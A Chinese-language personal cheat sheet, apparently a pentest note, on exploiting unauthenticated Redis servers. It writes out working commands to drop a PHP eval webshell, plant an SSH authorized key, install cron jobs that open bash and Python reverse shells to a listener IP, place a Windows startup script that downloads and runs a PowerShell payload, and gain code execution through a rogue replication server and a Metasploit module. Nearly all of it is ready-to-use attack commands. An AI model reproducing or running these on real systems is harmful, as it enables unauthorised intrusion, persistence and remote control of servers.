---
tags:
  - database
create_time: 2024-07-27 23:21
modified_time: 2024-07-27 23:21
status: complete
---

```text
# redis常用命令
查看信息：info
删除所有数据库内容：flushall
刷新数据库：flushdb
看所有键：KEYS *，使用select num可以查看键值数据。
设置变量：set test “who am i”
config set dir dirpath 设置路径等配置
config get dirfilename 获取路径及数据配置信息
save 保存
get 变量，查看变量名称
```

## 0x01 常规利用-未授权访问
无端口：
win自启动：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
     C:\Users\[用户名]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
linux定时任务：/var/spool/cron/crontabs/
结合22端口：/root/.ssh
结合80端口：/var/www/html/

```bash
# 由于redis写入文件会自带一些版本信息，如果不使用\r\n换行会导致无法执行
# 清缓存
flushall

# 结合80传马
config set dir /var/www/html/
config set dbfilename shell.php
set x "\n\n<?php @eval($_POST[1]);?>\n\n"
save


# 结合22写ssh，本机生成ssh-keygen -t rsa
config set dir /root/.ssh/ 
config set dbfilename authorized_keys 
set x "\r\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXXwkhCEBBTz8ujHRXd3dMgyDxNyOpntr4oK/L9V0HK/RMmqhhftfiwaT5kOZhJRExi8n5u5qFAJwaZEzypuIIuGLIxmw8awTmlM6bYGd7hC+QBGKvbiiXEhapnxGCuyGdsw/s5+E8i/wSsymlar+jo4BbThzYA7Hd9PmDNbYwsNLJLIVubrGT+NKyIdb+YmYtpE8nH4CR0u9M8hXom1cwqXmXKkPkktI2om4YQ4KAAU8L/XqVWnvYqWCxXy85qyZpgE7hX7EVjq9goddOA+CEE1TOXmmwIEtA6jzOLXzNWMqDQLP0LTNbBadbovyWAjGl/KeFxcgeAzR4MtCHu6HYngAJIVUiWxN9NIWts4J/RLrzgh1l4O4tZMdN9lCMOo6o2TTkQ0DLG7PupscqgE4oucSuyTuHe72neY0ZwtQ/1hm7oy60HpzCpmy20BQ90FJtQNrgDI51BdJZE3VGLp81SHV+QcE4MmJrrRxvNfnGA1O3TRRA+e5C0V007Cpl+Zs= kali@kali \r\n"
save

# 定时任务
## bash反弹 
config set dir /var/spool/cron/crontabs
config set dbfilename root 
set x '\n\n*/1 * * * * bash -i >& /dev/tcp/192.33.6.129/9999 0>&1\n\n' 
save

## python反弹 
config set dir /var/spool/cron/ crontabs
config set dbfilename root
set x "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.33.6.129\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n" 
save

# 开机自启
config set dir "C:\\Users\\yym\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
config set dbfilename attack.bat
set x "\r\n\r\n powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.11.33.244:80/a'))\"\r\n\r\n"
save
```

## 0x02 主从复制

恶意so下载地址：https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
下载后make

```bash
cd redis-rogue-server-master
mv redis-rogue-server.py ../RedisModules-ExecuteCommand-master
mv module.so exp.so
python3 redis-rogue-server.py --rhost 192.168.222.192 --rport 6379 --lhost 192.168.222.134 --lport 4444
```

## 0x03 MSF直接打
注意这里的msf一定要使用sudo的方式运行，不然没有权限去侦听端口。同时需要注意，把之前的实验的payload给删掉，或者重置你的redis。

```bash
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS 192.168.222.192
set LHOST 192.168.222.134
set SRVHOST 192.168.222.134
set SRVPORT 4445
run
```

